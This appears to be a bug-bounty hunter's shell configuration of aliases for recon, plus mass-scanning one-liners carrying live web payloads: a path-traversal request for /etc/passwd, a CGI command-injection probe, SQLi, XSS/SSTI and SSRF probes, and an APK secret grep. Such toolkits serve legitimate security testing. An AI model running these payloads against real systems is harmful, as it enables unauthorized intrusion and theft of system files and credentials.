
# Aliases 
crtsh(){
curl -s https://crt.sh/?Identity=%.$1 | grep ">*.$1" | sed 's/<[/]*[TB][DR]>/\n/g' | grep -vE "<|^[\*]*[\.]*$1" | sort -u | awk 'NF'
}

certspotter(){ 
curl -s https://certspotter.com/api/v0/certs\?domain\=$1 | jq '.[].dns_names[]' | sed 's/\"//g' | sed 's/\*\.//g' | sort -u | grep $1
} #h/t Michiel Prins

crtshprobe(){ #runs httprobe on all the hosts from certspotter
curl -s https://crt.sh/\?q\=\%.$1\&output\=json | jq -r '.[].name_value' | sed 's/\*\.//g' | sort -u | httprobe | tee -a ./all.txt
}

ipinfo(){
curl http://ipinfo.io/$1
}

myip(){
ifconfig | grep 192 | cut -d 'n'  -f 2 | cut -d ' ' -f 2
}

mybash(){
mousepad ~/.bashrc
}

myburpsuite(){
cd /home/ibrahim/Desktop/bugbounty/tools/burpsuite/ && bash runburp.sh &
}

myassetsubfinder(){ # Finish! / subdomains
assetfinder="assetfinder.txt"
subfinder="subfinder.txt"
amass="amass.txt"
github_subdomain="github-subdomain.txt"

assetfinder --subs-only $1 | httpx -silent -threads 100 | tee $assetfinder
subfinder -d $1 -all -o $subfinder
amass -active -brute -o $amass -d $1
cat $assetfinder | anew $subfinder > assetsubfinder_$1.txt
cat $amass | anew assetsubfinder_$1.txt > allsubdomains_$1.txt
mkdir backup_subdomains
mv $assetfinder $subfinder $amass ./backup_subdomains

# github-subdomain -d $1 -o $github_subdomain -t "","","",""
}

myaquatone(){ # Finish! / Screenshots
cat $1 | aquatone -out ./aquatone -ports xlarge
}

mywaymore(){ # Finish! / urls 
python3 /root/tools/waymore/waymore.py -i $1 -mode U -oU ./waymore_$1.txt
cat waymore_$1.txt | urldedupe -s  | uro > urldedupe_uro_$1.txt
cat urldedupe_uro_$1.txt | httprobe -c 80 -t 3000 | tee -a urldedupe_uro_alive_$1.txt 
cat urldedupe_uro_alive_$1.txt | wc -l

# github-endpoints -d $1 -o github-endpoints.txt -t "","","",""
}

myparamspider(){ # Finish! / parameters for a list of targets
paramspider -l $1
}

myparamspider_one(){ # Finish! / parameters for one target
paramspider -d $1
}

mygetjs(){ # Finish! / JS files
getJS --complete --input $1 --output jsfiles_$1.txt
}
mygetjs_one(){ # Finish! / JS files
getJS --complete --url $1 --output jsfiles_$1.txt
}
mygetjs_katana(){ # cat domains.txt
cat $1 | katana | grep js | httpx -mc 200 | tee js_sensitive_ouput_$1.txt
# https://realm3ter.medium.com/analyzing-javascript-files-to-find-bugs-820167476ffe
}

# Secretfinder starts
mysecretfinder(){ # Find Api key , aws key , google cloud key from source code and js file
cat $1 | xargs -I@ sh -c 'python3 /root/tools/SecretFinder/SecretFinder.py -i @'
}
mysecretfinder_nuclei(){
nuclei -l js.txt -t ~/nuclei-templates/exposures/ -o nuclei_js_sensitive_ouput_$1.txt
}
# Secretfinder ends


# xnlinkfinder
mylinkfinder_html(){ # Finish! # pass a normal url page or js url
python3 /root/tools/LinkFinder/linkfinder.py -i $1 -o linkfinder_$1.html
}
mylinkfinder_cli(){ # Finish!
python3 /root/tools/LinkFinder/linkfinder.py -i $1 -d -o cli
}

myxnlinkfinder() { # -i option take a url, also a file of urls
urls=$1
subdomains_with_http=$2 # syntax: https://www.target.com; https://help.target.com
subdomains_without_http=$3 # syntax: www.target.com; help.target.com
python3 /root/tools/xnLinkFinder/xnLinkFinder.py -i $urls -d 3 -sp $subdomains_with_http -sf $subdomains_without_http -s429 -s403 -sTO -sCE -m -o xnlinkfinder_endpoints_$1.txt -op xnlinkfinder_parameters_$1.txt -ow

# https://www.kitploit.com/2022/10/xnlinkfinder-python-tool-used-to.html
}
myxnlinkfinder_domains() {
urls=$1
subdomains_with_http=$2
subdomains_without_http=$3
cat $urls | python3 /root/tools/xnLinkFinder/xnLinkFinder.py -d 3 -sp $subdomains_with_http -sf $subdomains_without_http -s429 -s403 -sTO -sCE -m | unfurl domains | sort -u | tee xnlinkfinder_domains_$1.txt
}

myurl_tracker(){
nodejs /root/tools/url-tracker/app.js
}

# Nuclei starts
mynuclei(){
nuclei -t ~/Desktop/bugbounty/nuclei/nuclei-templates -l $1 -o output_nuclei.txt
}

mynuclei_one(){
echo $1 | nuclei -t ~/Desktop/bugbounty/nuclei/nuclei-templates
}

mynuclei_sqli(){
cat $1 | nuclei -t /root/nuclei-templates/costumize-templates-important/sqli -o output_nuclei_sqli.txt
}

mynuclei_xss(){
cat $1 | nuclei -t /root/nuclei-templates/costumize-templates-important/xss -o output_nuclei_xss.txt
}


mynuclei_crlf(){
cat $1 | nuclei -t /root/nuclei-templates/costumize-templates-important/crlf -o output_nuclei_crlf.txt
}

mynuclei_exposed(){
cat $1 | nuclei -t /root/nuclei-templates/costumize-templates-important/exposed -o output_nuclei_exposed.txt
}

mynuclei_header_injection(){
cat $1 | nuclei -t /root/nuclei-templates/costumize-templates-important/header_injection -o output_nuclei_header_injection.txt
}

mynuclei_lfi(){
cat $1 | nuclei -t /root/nuclei-templates/costumize-templates-important/lfi -o output_nuclei_lfi.txt
}

mynuclei_open_redirect(){
cat $1 | nuclei -t /root/nuclei-templates/costumize-templates-important/open_redirect -o output_nuclei_open_redirect.txt
}

mynuclei_rfi(){
cat $1 | nuclei -t /root/nuclei-templates/costumize-templates-important/rfi -o output_nuclei_rfi.txt
}

mynuclei_ssi_injection(){
cat $1 | nuclei -t /root/nuclei-templates/costumize-templates-important/ssi_injection -o output_nuclei_ssi_injection.txt
}

mynuclei_ldap_injection(){
cat $1 | nuclei -t /root/nuclei-templates/costumize-templates-important/ldap_injection -o output_nuclei_ldap_injection.txt
}
# Nuclei ends 


mydirsearch(){ # runs dirsearch and takes host and extension as arguments
dirsearch -u $1 -e $2 -t 50 -b 
}

mykeyhacks(){
bash /root/tools/keyhacks.sh/keyhacks.sh
}

mynotify(){
message=$1
token="your-token"
chatid="your-chat-id"
curl -s -X POST https://api.telegram.org/bot$token/sendMessage -d chat_id=$chatid -d text=$message
}

### XSS ###
myxss_dalfox(){ # Finish!
cat $1 | dalfox pipe
}
myxss_blind(){ # $1 -> parameters, $2 -> ibrahim.xss.ht
cat $1 | dalfox pipe -b $2
}
myxss_kxss(){ # reflected special characters
cat $1 | kxss 
}
myxss_kxss(){ # reflected parameters
cat $1 | Gxss 
}

### LFI ###
mylfi_dotdotpwn(){ # $1 -> http://testphp.vulnweb.com/search.php?test=
perl /root/tools/dotdotpwn/dotdotpwn.pl -m http-url -u $1TRAVERSAL -k "root:"
}
mylfi_ffuf(){
cat $1 | ffuf -u FUZZ -mr "root:x" -w $2 
}
mylfi_jopmanager(){
cat $1 | httpx -nc -p 880,443,8443,8080,8088,8888,9000,9001,9002,9003,4443 -path "/jobmanager/logs/..%252f..%252f..%252f......%252f..%252fetc%252fpasswd" -mr "root:x" -silent -rl 400 -timeout 2 -retries 2 -t 400
}
mylfi_many_paths(){
cat $1 | httpx -nc -p 880,443,8443,8080,8088,8888,9000,9001,9002,9003,4443 -path-list $2 -mr "root:x" -silent -rl 400 -timeout 2 -retries 2 -t 400
}
mylfi_one_path(){
cat $1 | httpx -nc -p 880,443,8443,8080,8088,8888,9000,9001,9002,9003,4443 -path $2 -mr "root:x" -silent -rl 400 -timeout 2 -retries 2 -t 400
}

### SQLi ###
mysqli_sqlmap(){ # Mass sql injection scanning command
cat $1 | gf sqli > sqli.txt; sqlmap -m sqli -batch -random-agent -level 3
}
mysqli_httpx(){
cat $1 | httpx -nc -silent -t 80 -p 80,443,8443,8080,8088,8888,9000,9001,9002,9003 -path "/app_dev.php/1'%20%22" -mr "An exception occurred" -timeout 2 -retries 2 -t 400 -rl 400
}

### SSRF ###
myssrf_qsreplace(){ # $2 -> http://YOUR.burpcollaborator.net
cat $1 | grep "=" | qsreplace $2 | httpx
}

### smuggler ###
mysmuggling_smuggler(){
 echo "mysmuggling_smuggler"
# https://github.com/defparam/smuggler.git
}

### CORS ###
mycors(){
 echo "mycors"
}

### OS command injection ###
myos_injection_httpx(){
cat $1 | httpx -path "/cgi-bin/admin.cgi?Command=sysCommand&Cmd=id" -ports 80,443,8443,8080,8088,8888,9000,9001,9002,9003 -mr "uid=" -silent -timeout 2 -retries 2 -t 300 -rl 300
}

### LDAP injection payloads ###
myldap_injection(){
 echo "myldap_injection"
}

### mix xss, sqli, ssti ###
mymix_ffuf(){
cat $1 | ffuf -w - -u "FUZZ;prompt(90522){{276*5}}'%20%22\\" -mr "prompt(90522)" -mr "An exception occurred" -mr "5520"
}

mysend_to_burpsuite(){
ffuf -mc 200 -w $1:HFUZZ -u HFUZZ -replay-proxy http:127.0.0.1:8080
}

# Android APK
myapk_extract_juicy(){
apktool d $1 ; grep -EHim "accesskey|admin|aes|api_key|apikey|checkClientTrusted|crypt|http:|https:|password|pinning|secret|SHA256|SharedPreferences|superuser|token|X509TrustManager|insert into" APKfolder
}





# Help Commands
my_bugbounty_commands(){
echo -e "
\e[31m\e[1m### Common ###\e[0m
> ipinfo
> myip
> mybash
> myburpsuite

\e[31m\e[1m### Find subdomains ###\e[0m
> crtsh target.com
> certspotter target.com
> crtshprobe target.com
> myassetsubfinder target.com

\e[31m\e[1m### Take screenshots ###\e[0m
> myaquatone subdomains.txt

\e[31m\e[1m### Get endpoints ###\e[0m
> mywaymore subdomains

\e[31m\e[1m### Get Parameters ###\e[0m
> myparamspider subdomains.txt
> myparamspider_one target.com

\e[31m\e[1m### Get JS files ###\e[0m
> mygetjs subdomains.txt
> mygetjs_one target.com
> mygetjs_katana subdomains.txt

\e[31m\e[1m### Get Secrets from JS files - SecretFinder.py ###\e[0m
> mysecretfinder js_sensitive_ouput_$1.txt
> mysecretfinder_nuclei js_sensitive_ouput_$1.txt

\e[31m\e[1m### Get endpoints from JS files ###\e[0m
> mylinkfinder_html js_urls.txt
> mylinkfinder_cli js_urls.txt
> myxnlinkfinder js_urls.txt
> myxnlinkfinder https://target.com/file.js

\e[31m\e[1m### Get subdomains from JS files ###\e[0m
> myxnlinkfinder_domains js_urls.txt subdomains_https.txt subdomains_nohttps.txt

\e[31m\e[1m### Tracking stuffs ###\e[0m
> myurl_tracker

\e[31m\e[1m### Nuclei ###\e[0m
> mynuclei urls.txt
> mynuclei_one target.com
> mynuclei_sqli urls.txt
> mynuclei_xssmynuclei_crlf urls.txt
> mynuclei_crlf urls.txt
> mynuclei_exposed urls.txt
> mynuclei_header_injection urls.txt
> mynuclei_lfi urls.txt
> mynuclei_open_redirect urls.txt
> mynuclei_rfi urls.txt
> mynuclei_ssi_injection urls.txt
> mynuclei_ldap_injection urls.txt

\e[31m\e[1m### dirsearch ###\e[0m
> mydirsearch https://target.com php,asp

\e[31m\e[1m### keyhacks ###\e[0m
> mykeyhacks

\e[31m\e[1m### notify ###\e[0m
> command | mynotify welcome

\e[31m\e[1m### XSS ###\e[0m
> mydalfox parameters_urls.txt
> myxss_blind
> myxss_kxss
> myxss_Gxss

\e[31m\e[1m### LFI ###\e[0m
> mylfi_dotdotpwn target.com
> mylfi_ffuf urls.txt lfi-payloads.txt
> mylfi_jopmanager urls.txt
> mylfi_many_paths urls.txt lfi_payloads.txt
> mylfi_one_path urls.txt path/to

\e[31m\e[1m### SQLi ###\e[0m
> mysqli_sqlmap urls.txt
> mysqli_httpx urls.txt

\e[31m\e[1m### SSRF ###\e[0m
> myssrf_qsreplace urls.txt my-burp-calloborator

\e[31m\e[1m### smuggler ###\e[0m
> mysmuggling_smuggler urls.txt

\e[31m\e[1m### CORS ###\e[0m
> mycors urls.txt

\e[31m\e[1m### OS command injection ###\e[0m
> myos_injection_httpx urls.txt

\e[31m\e[1m### LDAP injection ###\e[0m
> myldap_injection urls.txt

\e[31m\e[1m### mix testing for xss, sqli, ssti ###\e[0m
> mymix_ffuf urls.txt

\e[31m\e[1m### Burpsuite ###\e[0m
> mysend_to_burpsuite urls.txt

\e[31m\e[1m### extract sensitive infos from APK ###\e[0m
> myapk_extract_juicy app.apk
"
}


my_methodology(){
echo -e "
\e[34m
### Methodology: testing a website ###
1. Gather subdomains
2. take screenshots
3. gather urls
4. gather parameters
5. gather js files
6. search in js file for
	- sensitive infos
	- urls
7. nuclei templates for 
	- sqli
	- xss
	- ssrf
	- template injection
	- others
8. nuclei templates in general
9. oneliner

### Methodology: parameters bruteforcing! ###
1. get possible parameters from xnlinkfinder
2. pass the parameter to arjun 
3. test them!

### Methodology: parameters bruteforcing! ###
- jsmon
- url-tracker
\e[0m

"
}

my_colors(){
echo "
Text Color:

Black: \e[30m
Red: \e[31m
Green: \e[32m
Yellow: \e[33m
Blue: \e[34m
Magenta: \e[35m
Cyan: \e[36m
White: \e[37m
Text Styles:

Reset: \e[0m
Bold: \e[1m
Underline: \e[4m
Blink: \e[5m
Reverse: \e[7m
"
}

my_commands(){
echo -e "
\e[34m
######### amass #########  
amass -active -brute -o output.txt -d yahoo.com
puredns bruteforce wordlist.txt example.com -r resolvers.txt -w output.txt

######### aquatone #########  
cat mydomains.txt | aquatone -out /root/Desktop -threads 25 -ports 8080

######### eyeWitness #########
eyeWitness -f url-list.txt --web --default-creds

######### dirsearch #########
# -e for extension 
# -t for threads 
# --proxy=http://127.0.0.1:8080
# --recursive
# --random-agents
# --exclude-status=400,403,404
python3 dirsearch.py -u https://target-website.local -w wordlist -e txt,xml,php

######### LinkFinder #########

######### aquatone #########

######### ffuf #########
ffuf -w /path/to/wordlist -u https://target/FUZZ

ffuf -w /path/to/vhost/wordlist -u https://target -H 'Host: FUZZ'

https://github.com/vavkamil/awesome-bugbounty-tools#fuzzing
\e[0m
"
}
